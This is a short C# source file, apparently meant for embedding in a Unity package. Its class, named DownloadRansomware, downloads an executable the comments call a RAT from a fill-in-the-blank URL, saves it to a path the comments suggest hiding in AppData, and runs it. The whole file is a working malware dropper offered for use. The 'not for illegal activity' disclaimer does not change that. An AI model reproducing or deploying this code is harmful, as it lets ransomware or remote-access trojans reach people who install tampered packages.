using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace UnitypackageRussianRoulett
{
    //Dont use that for Illegal aktivity! Made by Mei-chan 
    //Github: https://github.com/Neko-Oneechan
    public class DownloadRansomware
    {
        private static string downloadurl = ""; //Add here ur File Download! 
        private static string filenamedownload = ""; //Add here the name fronm ur like "a.exe"
        private static string downloadpath = ""; //Add here the path where it should be stored. Suitable order to hide this would be Appdata

        //To use this, call that Methode
        public static void RunDownloadedProgramm()
        {
            DownloadRat();
            Process.Start(downloadpath+filenamedownload);
        }


        //To Download the *.exe and store it.
        private static void DownloadRat()
        {
            using (var downloader = new WebClient())
            {
                downloader.DownloadFile(downloadurl, downloadpath+filenamedownload);
            }
        }
    }
}
